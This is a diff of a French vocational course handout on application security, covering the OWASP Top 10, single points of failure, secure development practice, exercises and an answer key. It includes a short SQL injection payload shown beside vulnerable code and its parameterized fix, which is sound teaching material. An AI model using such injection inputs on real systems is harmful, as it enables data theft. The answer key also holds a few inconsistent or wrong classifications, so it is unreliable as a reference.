-| Ã‰lÃ©ment | Composant |
+| # | Catégorie | Description | Exemple |
+|---|-----------|-------------|---------|
+| **A01** | **Broken Access Control** | On accède à quelque chose sans permission | Lire les données d'un autre client |
+| **A02** | **Cryptographic Failures** | Données non protégées (pas HTTPS, clair, etc) | Mots de passe en clair |
+| **A03** | **Injection** | On rentre du code dans un formulaire | SQL injection, commandes |
+| **A04** | **Insecure Design** | Architecture mal pensée | API sans authentification |
+| **A05** | **Security Misconfiguration** | Mal configuré | Debug mode actif, fichiers publics |
+| **A06** | **Vulnerable Components** | Dépendances outdated | Log4j sans patch |
+| **A07** | **Identification Failures** | Authentification faible | Mot de passe facile |
+| **A08** | **Software & Data Integrity Failures** | Pas de signature/vérification | Modification en transit |
+| **A09** | **Logging & Monitoring Failures** | Pas de traçabilité | On sait pas qui a fait quoi |
+| **A10** | **SSRF** | Force l'app à accéder à des ressources internes | Accéder à AWS metadata |
+
+## 5.2 Focus sur A06 : Vulnerable Components
+
+**C'est la catégorie de Log4Shell !**
+
+```
+Les risques :
+├─ Utiliser des librairies populaires (moins surveillées = failles)
+├─ Ne pas mettre à jour les dépendances
+├─ Ne pas scanner les dépendances (npm audit, mvn dependency-check)
+└─ Faire confiance aveugle aux dépendances
+
+Solutions :
+├─ Audit régulier des dépendances
+├─ Mise à jour automatique des correctifs
+├─ Scanning de sécurité dans le CI/CD
+├─ Inventaire des dépendances
+└─ Monitoring des alertes de sécurité
+```
+
+## 5.3 Focus sur A03 : Injection SQL
+
+**Faille très commune en développement**
+
+```javascript
+// ❌ DANGEREUX : Injection SQL possible
+const id = req.query.id;
+const query = `SELECT * FROM users WHERE id = ${id}`;
+// Attaquant envoie : id = 1 OR 1=1 --
+// Requête devient : SELECT * FROM users WHERE id = 1 OR 1=1 --
+// RÉSULTAT : Tous les utilisateurs sont lus !
+
+// ✅ SÉCURISÉ : Utiliser des requêtes paramétrées
+const query = `SELECT * FROM users WHERE id = ?`;
+db.execute(query, [id]);
+// Le ? est remplacé de manière sûre
+```
+
+---
+
+# 6. LE CONCEPT DE SPOF
+
+## 6.1 Définition
+
+> 📘 **SPOF = Single Point Of Failure**
+> 
+> Composant critique dont si elle échoue, **tout s'arrête**.
+
+## 6.2 Exemples dans une app
+
+```
+SPOF CRITIQUES :
+├─ Une seule instance serveur
+│  (pas de load balancing, pas de failover)
+│
+├─ Une seule base de données
+│  (pas de réplication, pas de backup)
+│
+├─ Un seul développeur avec la "connaissance"
+│  (documentation = 0)
+│
+├─ Dépendance externe indispensable
+│  (Log4j pour les logs, CrowdStrike pour la sécu)
+│
+└─ Clé API ou secret en dur dans le code
+   (stockée en clair = risque énorme)
+```
+
+## 6.3 Comment identifier un SPOF
+
+**Se demander : "Si [composant] échoue, qu'est-ce qui arrive ?"**
+
+- Si la réponse est "tout s'arrête" → **SPOF**
+- Si la réponse est "on bascule sur le backup" → **OK**
+
+## 6.4 Solutions contre les SPOF
+
+| SPOF | Solution |
+|------|----------|
+| Serveur unique | Ajouter replicas, load balancer |
+| BDD unique | Réplication master-slave ou cluster |
+| Dépendance critique | Alternatives, plans B, monitoring |
+| Personne unique | Documentation, formation, croiser les connaissances |
+| Secrets en dur | Coffre-fort de secrets (Vault, AWS Secrets Manager) |
+
+---
+
+# 7. INTRODUCTION À LA CYBERSÉCURITÉ APPLICATIVE
+
+## 7.1 Sécurité dès la conception (Secure by Design)
+
+La sécurité doit être pensée **dès le départ**, pas ajoutée après.
+
+```
+❌ Mauvais : Développer → Tester → Dire "c'est sécurisé"
+✅ Bon : Penser sécurité → Coder sécurisé → Tester → Déployer
+
+Ça inclut :
+├─ Threat modeling (anticiper les attaques)
+├─ Code review avec l'angle sécurité
+├─ Tests de sécurité (SAST, DAST)
+├─ Gestion des secrets
+└─ Monitoring des anomalies
+```
+
+## 7.2 Bonnes pratiques en développement
+
+```
+✅ FAIRE :
+├─ Valider TOUTES les entrées utilisateur
+├─ Utiliser des requêtes paramétrées (pas de concat SQL)
+├─ Chiffrer les données sensibles
+├─ Utiliser HTTPS partout
+├─ Garder les secrets en dehors du code
+├─ Mettre à jour les dépendances régulièrement
+├─ Implémenter du logging (traçabilité)
+├─ Tester la sécurité (pentesting)
+└─ Documenter les décisions de sécurité
+
+❌ NE PAS FAIRE :
+├─ Faire confiance aux données utilisateur
+├─ Concaténer du SQL
+├─ Stocker les mots de passe en clair
+├─ Utiliser HTTP pour les données sensibles
+├─ Laisser les secrets dans le code
+├─ Ignorer les mises à jour de dépendances
+├─ Déployer sans tests
+└─ Cacher les erreurs aux utilisateurs
+```
+
+## 7.3 Processus de sécurité en équipe
+
+```
+1. THREAT MODELING
+   "Qu'est-ce qu'un attaquant pourrait faire ?"
+   
+2. SECURE DESIGN
+   "Comment on la construit sécurisée ?"
+   
+3. SECURE CODE
+   "On code avec les bonnes pratiques"
+   
+4. CODE REVIEW
+   "Pair programming avec angle sécurité"
+   
+5. TESTS DE SÉCURITÉ
+   "SAST (static), DAST (dynamic), Pen Testing"
+   
+6. MONITORING
+   "Détecter les anomalies en production"
+   
+7. INCIDENT RESPONSE
+   "Si attaque, réagir rapidement"
+```
+
+---
+
+# 8. EXERCICES D'APPLICATION
+
+## Exercice 1 : Identifier les composants Laudon dans une app
+
+Pour chaque élément ci-dessous, indiquez le composant du SI correspondant (M, L, D, P ou H) :
+
+| Élément | Composant |
 |---------|-----------|
-| Un serveur Dell PowerEdge | _____ |
-| La base de donnÃ©es clients | _____ |
-| Le logiciel de comptabilitÃ© Sage | _____ |
-| La charte informatique de l'entreprise | _____ |
-| Le technicien rÃ©seau | _____ |
-| Les sauvegardes quotidiennes | _____ |
-| Le systÃ¨me d'exploitation Windows Server | _____ |
-| La procÃ©dure de gestion des mots de passe | _____ |
+| Un serveur NodeJS | _____ |
+| La base de données PostgreSQL | _____ |
+| La librairie Log4j | _____ |
+| La procédure de deployment | _____ |
+| Le développeur backend | _____ |
+| Les fichiers de logs | _____ |
+| Le système d'exploitation Linux | _____ |
+| La politique de gestion des mots de passe | _____ |
 
 ---
 
-## Exercice 2 : Distinguer vulnÃ©rabilitÃ© et menace
+## Exercice 2 : Distinguer vulnérabilité et menace
 
-Pour chaque situation, identifiez la vulnÃ©rabilitÃ© et la menace :
+Pour chaque situation, identifiez la vulnérabilité et la menace :
 
-**a) Un employÃ© reÃ§oit un email de phishing et clique sur le lien malveillant.**
+**a) Log4Shell (sans patch) et un attaquant qui exploite**
 
-- VulnÃ©rabilitÃ© : ______________________________________
+- Vulnérabilité : ______________________________________
 - Menace : ______________________________________
 
-**b) Un hacker exploite une faille connue sur un serveur web non mis Ã  jour.**
+**b) Un dev stocke un mot de passe en dur, quelqu'un lit le code source**
 
-- VulnÃ©rabilitÃ© : ______________________________________
+- Vulnérabilité : ______________________________________
 - Menace : ______________________________________
 
-**c) Un incendie dÃ©truit la salle serveur oÃ¹ se trouvent les sauvegardes.**
+**c) Une injection SQL : pas de validation d'entrée, attaquant envoie du SQL**
 
-- VulnÃ©rabilitÃ© : ______________________________________
+- Vulnérabilité : ______________________________________
 - Menace : ______________________________________
 
 ---
 
 ## Exercice 3 : Calcul de risque EBIOS
 
-Ã‰valuez le niveau de risque pour chaque situation (V Ã— I) :
+Évaluez le niveau de risque pour chaque situation (V × I) :
 
 | Situation | V (1-4) | I (1-4) | Risque | Niveau |
 |-----------|---------|---------|--------|--------|
-| Serveur de 10 ans hÃ©bergeant les donnÃ©es clients | | | | |
-| Poste de travail avec antivirus Ã  jour | | | | |
-| Sauvegarde quotidienne testÃ©e mensuellement | | | | |
-| Mot de passe admin partagÃ© entre 5 personnes | | | | |
-| WiFi ouvert aux visiteurs sans isolation rÃ©seau | | | | |
+| Log4j sans patch hébergeant données clients | | | | |
+| Dépendance npm à jour | | | | |
+| Secret d'API en dur dans le code | | | | |
+| Validation des entrées correctement faite | | | | |
+| Pas de HTTPS sur formulaire login | | | | |
 
 ---
 
-## Exercice 4 : Identifier les SPOF
+## Exercice 4 : Identifier les SPOF dans une app
 
-Dans la liste suivante, identifiez les SPOF potentiels et proposez une solution :
+Identifiez les SPOF potentiels et proposez une solution :
 
-| Ã‰lÃ©ment | SPOF ? (Oui/Non) | Solution proposÃ©e |
-|---------|------------------|-------------------|
-| Serveur unique hÃ©bergeant l'ERP | | |
-| Deux liaisons Internet (Orange + SFR) | | |
-| Technicien informatique unique | | |
-| Sauvegardes sur 3 sites diffÃ©rents | | |
-| Mot de passe root connu d'une seule personne | | |
-
----
-
-## Exercice 5 : RÃ©flexion sur CrowdStrike
-
-RÃ©pondez aux questions suivantes en quelques lignes :
-
-**a) Pourquoi l'incident CrowdStrike illustre-t-il parfaitement le concept de SPOF ?**
-
-_________________________________________________________________
-
-_________________________________________________________________
-
-**b) Quelle mesure aurait pu limiter l'impact de cet incident pour une organisation ?**
-
-_________________________________________________________________
-
-_________________________________________________________________
-
-**c) Quel composant du SI (Laudon) Ã©tait Ã  l'origine du problÃ¨me ? Quels autres composants ont Ã©tÃ© impactÃ©s ?**
-
-_________________________________________________________________
-
-_________________________________________________________________
+| Élément | SPOF ? | Solution |
+|---------|--------|----------|
+| Une seule instance serveur Node | | |
+| Clé API stockée dans .env.production | | |
+| Un seul développeur connait auth | | |
+| Cache Redis avec failover automatique | | |
+| Dépendance npm sans alternative | | |
 
 ---
 
-# CORRIGÃ‰ DES EXERCICES
+## Exercice 5 : Classification OWASP
 
-## Exercice 1 : CorrigÃ©
+Pour chaque vulnérabilité, identifiez la catégorie OWASP correspondante :
 
-| Ã‰lÃ©ment | Composant |
+| Vulnérabilité | Catégorie OWASP |
+|---|---|
+| Log4j vulnerability (RCE) | _____ |
+| Mot de passe en clair en BDD | _____ |
+| Injection SQL | _____ |
+| API sans authentification | _____ |
+| Dépendance npm outdated | _____ |
+
+---
+
+# CORRIGÉ DES EXERCICES
+
+## Exercice 1 : Corrigé
+
+| Élément | Composant |
 |---------|-----------|
-| Un serveur Dell PowerEdge | **M** (MatÃ©riel) |
-| La base de donnÃ©es clients | **D** (DonnÃ©es) |
-| Le logiciel de comptabilitÃ© Sage | **L** (Logiciel) |
-| La charte informatique de l'entreprise | **P** (ProcÃ©dures) |
-| Le technicien rÃ©seau | **H** (Personnel) |
-| Les sauvegardes quotidiennes | **D** (DonnÃ©es) |
-| Le systÃ¨me d'exploitation Windows Server | **L** (Logiciel) |
-| La procÃ©dure de gestion des mots de passe | **P** (ProcÃ©dures) |
+| Un serveur NodeJS | **M** (Matériel) |
+| La base PostgreSQL | **D** (Données) |
+| La librairie Log4j | **L** (Logiciel) |
+| Procédure deployment | **P** (Procédures) |
+| Développeur backend | **H** (Human) |
+| Fichiers de logs | **D** (Données) |
+| Système d'exploitation Linux | **L** (Logiciel) |
+| Politique mots de passe | **P** (Procédures) |
 
 ---
 
-## Exercice 2 : CorrigÃ©
+## Exercice 2 : Corrigé
 
-**a)** 
-- VulnÃ©rabilitÃ© : Personnel non sensibilisÃ© au phishing
-- Menace : Email de phishing (attaquant)
+**a)**
+- Vulnérabilité : Log4j contient une faille RCE
+- Menace : Attaquant exploit cette faille
 
-**b)** 
-- VulnÃ©rabilitÃ© : Serveur non mis Ã  jour
-- Menace : Hacker exploitant la faille
+**b)**
+- Vulnérabilité : Secret en dur dans le code
+- Menace : Quelqu'un accède au code source
 
-**c)** 
-- VulnÃ©rabilitÃ© : Sauvegardes sur le mÃªme site
-- Menace : Incendie
+**c)**
+- Vulnérabilité : Pas de validation des entrées
+- Menace : Attaquant envoie du SQL malveillant
 
 ---
 
-## Exercice 3 : CorrigÃ© indicatif
+## Exercice 3 : Corrigé indicatif
 
 | Situation | V | I | Risque | Niveau |
 |-----------|---|---|--------|--------|
-| Serveur de 10 ans hÃ©bergeant les donnÃ©es clients | 4 | 4 | 16 | ðŸ”´ CRITIQUE |
-| Poste de travail avec antivirus Ã  jour | 2 | 1 | 2 | ðŸŸ¢ FAIBLE |
-| Sauvegarde quotidienne testÃ©e mensuellement | 2 | 2 | 4 | ðŸŸ¡ MODÃ‰RÃ‰ |
-| Mot de passe admin partagÃ© entre 5 personnes | 4 | 3 | 12 | ðŸ”´ CRITIQUE |
-| WiFi ouvert aux visiteurs sans isolation rÃ©seau | 3 | 2 | 6 | ðŸŸ¡ MODÃ‰RÃ‰ |
+| Log4j sans patch | 4 | 4 | 16 | 🔴 CRITIQUE |
+| npm à jour | 1 | 1 | 1 | 🟢 FAIBLE |
+| Secret en dur | 4 | 4 | 16 | 🔴 CRITIQUE |
+| Validation OK | 1 | 1 | 1 | 🟢 FAIBLE |
+| Pas HTTPS | 3 | 3 | 9 | 🟠 ÉLEVÉ |
 
 ---
 
-## Exercice 4 : CorrigÃ©
+## Exercice 4 : Corrigé
 
-| Ã‰lÃ©ment | SPOF ? | Solution |
-|---------|--------|----------|
-| Serveur unique hÃ©bergeant l'ERP | **OUI** | Serveur de secours ou cluster haute disponibilitÃ© |
-| Deux liaisons Internet (Orange + SFR) | NON | Redondance dÃ©jÃ  en place |
-| Technicien informatique unique | **OUI** | Formation d'un backup, documentation des procÃ©dures |
-| Sauvegardes sur 3 sites diffÃ©rents | NON | Redondance suffisante |
-| Mot de passe root connu d'une seule personne | **OUI** | Coffre-fort de mots de passe, partage sÃ©curisÃ© |
-
----
-
-## Exercice 5 : Ã‰lÃ©ments de rÃ©ponse
-
-**a)** CrowdStrike = SPOF car : logiciel unique, dÃ©ployÃ© partout, pas d'alternative, mise Ã  jour automatique sans contrÃ´le client.
-
-**b)** Mesures possibles : dÃ©lai de dÃ©ploiement des mises Ã  jour, environnement de test, segmentation du parc, plan B sans CrowdStrike.
-
-**c)** Origine : **Logiciel (L)**. Impacts : MatÃ©riel (Ã©cran bleu), DonnÃ©es (inaccessibles), ProcÃ©dures (bloquÃ©es), Personnel (inactif).
+| Élément | SPOF | Solution |
+|---------|------|----------|
+| Serveur unique | **OUI** | Ajouter replicas + load balancer |
+| Clé API en dur | **OUI** | Secrets manager (Vault, AWS Secrets) |
+| Dev unique auth | **OUI** | Documentation, formation, pair coding |
+| Redis failover | NON | Déjà protégé |
+| npm sans alt | **OUI** | Chercher alternatives, faire code custom |
 
 ---
 
+## Exercice 5 : Corrigé
 
+| Vulnérabilité | Catégorie OWASP |
+|---|---|
+| Log4j RCE | **A06** (Vulnerable Components) |
+| Mot de passe clair | **A02** (Cryptographic Failures) |
+| Injection SQL | **A03** (Injection) |
+| API sans auth | **A07** (Identification Failures) |
+| npm outdated | **A06** (Vulnerable Components) |
 
 ---
 
-*BTS SIO - Bloc 3 - CybersÃ©curitÃ© et RÃ©silience - Support de cours SÃ©ance 1*
+---
+
+*BTS SIO - Bloc 1 & 3 - Cybersécurité et Résilience - Support de cours - SLAM*
